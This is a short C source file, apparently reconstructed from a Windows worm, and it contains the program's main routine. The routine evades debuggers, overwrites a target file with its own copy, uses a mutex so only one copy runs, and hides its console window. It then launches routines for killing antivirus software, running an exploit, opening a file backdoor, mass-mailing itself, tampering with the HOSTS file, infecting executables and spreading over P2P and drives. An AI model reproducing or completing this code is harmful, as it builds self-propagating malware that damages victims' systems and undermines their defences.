#include "data_globals.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma optimize("", off)
int main(int argc, char **argv, char **env)
{
    volatile struct _LocalCtx {
        BOOL is_debugger_present;
        int result;
        DWORD last_error;
        HWND hWnd;
        CHAR local_110[256];
    } ctx;

    // Variables are not initialized at declaration; they will be assigned later.
    // No explicit assignments needed here.

    ctx.is_debugger_present = IsDebuggerPresent();
    if (ctx.is_debugger_present == 0) {
        if (argc == 2) {
            GetModuleFileNameA(NULL, ctx.local_110, sizeof(ctx.local_110));
            if (strcmp(argv[1], ctx.local_110) != 0) {
                SetFileAttributesA(argv[1], FILE_ATTRIBUTE_NORMAL);
                CopyFileA(ctx.local_110, argv[1], FALSE);
            }
        }
        CreateMutexA(NULL, FALSE, "Wer45bbrtb439");
        ctx.last_error = GetLastError();
        if (ctx.last_error == ERROR_ALREADY_EXISTS) {
            ctx.result = 1;
        } else {
            AllocConsole();
            ctx.hWnd = FindWindowA("ConsoleWindowClass", NULL);
            ShowWindow(ctx.hWnd, SW_HIDE);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_AntiVirusTerminate, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ExploitMain, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_FileBackdoor, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_MassMailMain, NULL, 0, NULL);
            _Install();
            _HOSTSFile();
            _InfectExes();
            p2p_spread();
            InfectDrives();
            ctx.result = 0;
        }
    } else {
        ctx.result = 1;
    }
    return ctx.result;
}
#pragma optimize("", on)
